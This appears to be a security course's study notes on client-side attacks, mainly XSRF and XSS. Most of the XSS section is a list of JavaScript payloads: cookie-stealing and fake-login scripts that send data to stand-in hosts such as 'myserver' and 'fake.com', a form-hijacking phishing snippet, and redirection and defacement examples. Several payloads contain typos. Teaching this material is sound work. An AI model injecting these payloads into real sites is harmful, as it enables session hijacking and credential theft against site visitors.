# Red 09: Client Side Exploits

## OUTLINE
- Overview
- XSRF
- XSS

`Client-side attacks` occur when a user downloads `malicious content.` The flaw of data is reversed compared to server-side attacks: client-side attacks initiate from the victim who downloads content from the attacker.

## CLIENT SIDE ATTACK
- Attack where the connection is initiated
    - Enticed to malicious links/IM, redirection via XSS etc.

<br>

## XSRF
- Take advantage of user's trust in their browser.
- Requests to a particular website are authenticated via a cookie.

<br>

## XSS
- An `XSS` is when an attacker injects text on a site that will be presented to future clients (site visitors) as if that came directly from the origin server and is interpreted by the client as valid HTML/JS
- Can be used to:
    - Steal session data
    - Install malware
    - Redirect user to another page
    - Modify page content
- Stored XSS
    - You are able to write code that is stored, but not run, by a web server (in a database) and served to users of the website at a later point.
- Reflected XSS
    - You are able to write code that is contained within the url of a website and then that code is loaded onto a target's page/
- Testing for XSS  
     `<script>alert('XSS');</script>`
- Redirect  
    `<script>window.location = "http://myserver/";</script>`
- Defacement  
    `<script>document.body.innerHTML="Ricky Astely";</script>`
- Phishing
    ```
    <script>
    document.forms[0].onsubmit=myfunction;
    document.forms[0].btnNew.onclick=myfuntion;
    document.forms[0].action="http://myserver/phish.php";
    </script>
- Cookie Stealing
    ```
    <script>
    new Image().src="http://myserver/listen.php?cookie="+encodeURI(document.cookie);
    </script>
    ```
- Fake Login
    ```
    <script>
    username=promt('Please enter your username','');
    password=prompt('Please enter your password','');
    document.write("<umage src=\"http://myserver/listen.php?username="+username+"&password="+password+"\">");
    </script>

<br>

## CLIENT SIDE INFORMATION GATHERING
- Enumeration - What info can I gather?
    - Browser version
    - OS
    - IP
- Tools - JavaScript
    - JavaScript it the only tool available to us in the browser

<br>

## ENUMERATION - USER AGENT
    ```
    <script>
    new Image().src = 'http://fake.com/x.php?
    output=' + navigator.userAgent;
    </script>

<br>

## CLIENT SIDE EXPLOITATION
- The target needs to visits your server!!
    - You will host the exploit.
    - it is on you to get the client to visit your server
- Leverage a server you control
    - If you control a server the target frequents you can exploit from that server

<br>

## EXPLOIT - REDIRECTION
```
    <script>
    window.document.location.href='http://face.com/exploit.php';
    </script>
```

<br>

## EXPLOITATION - SESSION GRABBING
```
    <script>
        new Image().src = 'http://fake.com/x.php?
        output='+encodeURI(document.cookie);
    </script>
```

<br>

## SUMMARY
1. You are attacking the `CLIENT`, not the server
2. You have to get the target come to you